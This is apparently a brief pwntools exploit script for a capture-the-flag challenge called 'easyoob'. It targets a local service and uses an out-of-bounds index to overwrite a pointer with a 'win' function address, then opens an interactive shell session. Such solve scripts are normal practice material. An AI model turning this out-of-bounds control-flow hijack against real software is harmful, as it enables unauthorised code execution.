from pwn import *

# r = process("./easyoob")
r = remote("localhost", 10524)

INDEX = 0x15
WIN = 0x4011b6+5

print(f"2 {INDEX} {WIN} {0}")
r.sendline(f"2 {INDEX} {WIN} {0}")
r.sendline(f"3")
r.interactive()
